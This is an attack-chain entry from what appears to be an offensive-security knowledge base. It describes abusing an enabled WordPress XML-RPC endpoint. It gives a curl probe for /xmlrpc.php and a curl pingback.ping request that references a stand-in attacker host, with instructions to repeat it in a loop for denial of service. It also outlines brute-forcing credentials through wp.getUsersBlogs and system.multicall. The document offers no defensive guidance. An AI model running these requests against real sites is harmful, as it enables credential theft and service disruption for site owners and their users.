---
id: ac-wordpress-xmlrpc-bruteforce-dos
name: WordPress XML-RPC Enabled Enabling Brute Force and DoS Attacks
tags:
  - wordpress
  - xmlrpc
  - brute-force
  - dos
  - web-vulnerability
type: attack_chain
tools: []
tactics:
  - '[[Reconnaissance]]'
  - '[[Credential Access]]'
  - '[[Impact]]'
verified: false
platforms:
  - Web
submitted: true
complexity: low
created_at: '2023-10-01T00:00:00Z'
procedures:
  - '[[procedures/Detect-Enabled-XML-RPC-Endpoint]]'
  - '[[procedures/Exploit-XML-RPC-for-Brute-Force-or-DoS]]'
step_count: 2
techniques:
  - '[[Active Scanning]]'
  - '[[Brute Force]]'
  - '[[Network Denial of Service]]'
updated_at: '2025-12-14T17:26:48.211Z'
description: >-
  Attack chain exploiting an enabled XML-RPC endpoint in WordPress to confirm
  vulnerability and perform brute force credential attacks or resource
  exhaustion DoS.
skill_level: beginner
impact_level: high
validated: true
mitre_tactics:
  - '[[Reconnaissance]]'
  - '[[Credential Access]]'
  - '[[Impact]]'
mitre_techniques:
  - '[[Active Scanning]]'
  - '[[Brute Force]]'
  - '[[Network Denial of Service]]'
---
# WordPress XML-RPC Enabled Enabling Brute Force and DoS Attacks

Multi-stage attack chain demonstrating discovery and exploitation of enabled XML-RPC in WordPress, leading to unauthorized access via brute force or server denial-of-service through resource-intensive calls.

## Chain Metrics Dashboard

| Metric | Value |
|--------|-------|
| Chain Status | Unverified |
| Total Steps | 2 |
| Execution Time | ~5 minutes |
| Skill Level | Beginner |
| Complexity | Low |
| Impact Level | High |

## Attack Flow Visualization

```mermaid
graph LR
    A[Reconnaissance: Detect XML-RPC] --> B[Exploitation: Brute Force or DoS]
    B --> C[Impact: Access or Disruption]

    style A fill:#e74c3c
    style B fill:#f39c12
    style C fill:#27ae60
```

## Prerequisites & Requirements

### Required Tools

- None (uses standard HTTP clients like curl)

### Target Environment

- WordPress-based web application
- Accessible web server (HTTP/HTTPS)
- No authentication required for initial detection

### Initial Access Requirements

- Public network access to the target website
- No prior credentials needed for detection

## Detailed Attack Procedures

### Step 1: Detect Enabled XML-RPC Endpoint
procedure: [[procedures/Detect-Enabled-XML-RPC-Endpoint]]

**Objective**: Confirm if the XML-RPC endpoint is accessible, indicating potential for brute force or DoS attacks.

**Instructions**: Use [[commands/curl-check-xmlrpc]] to send a HEAD request to the /xmlrpc.php endpoint:

```bash
curl -I https://target.com/xmlrpc.php
```

If the response is 200 OK, the endpoint is enabled.

**Expected Output**: HTTP 200 OK response with XML-RPC server details.

**Success Indicators**:
- 200 OK status code returned
- Response body contains XML-RPC method list or error indicating service availability

### Step 2: Exploit XML-RPC for Brute Force or DoS
procedure: [[procedures/Exploit-XML-RPC-for-Brute-Force-or-DoS]]

**Objective**: Leverage the enabled endpoint to perform credential brute force using system.multicall or exhaust resources via pingback.ping for DoS.

**Instructions**: For brute force, craft XML-RPC requests to wp.getUsersBlogs with guessed credentials using a tool like xmlrpc-bruteforcer or scripted curl. For DoS, send multiple pingback.ping requests:

```bash
curl -d '<methodCall><methodName>pingback.ping</methodName><params><param><value><string>https://attacker.com/payload</string></value></param><param><value><string>https://target.com/</string></value></param></params></methodCall>' https://target.com/xmlrpc.php
```

Repeat in a loop to consume resources.

**Expected Output**: For brute force, successful authentication response; for DoS, server slowdown or unresponsiveness.

**Success Indicators**:
- Valid login response for brute force
- Increased server load or timeouts indicating DoS

## Attack Chain Summary

### Key Achievements

1. Confirmed XML-RPC exposure on WordPress site
2. Enabled potential unauthorized access via brute force
3. Demonstrated DoS capability through resource exhaustion

## Technique & Tactic Coverage

### MITRE ATT&CK Techniques

- [[Active Scanning]] Active Scanning
- [[Brute Force]] Brute Force
- [[Network Denial of Service]] Network Denial of Service

### MITRE ATT&CK Tactics

- [[Reconnaissance]] Reconnaissance
- [[Credential Access]] Credential Access
- [[Impact]] Impact

---
*Last updated: 2023-10-01T00:00:00Z*
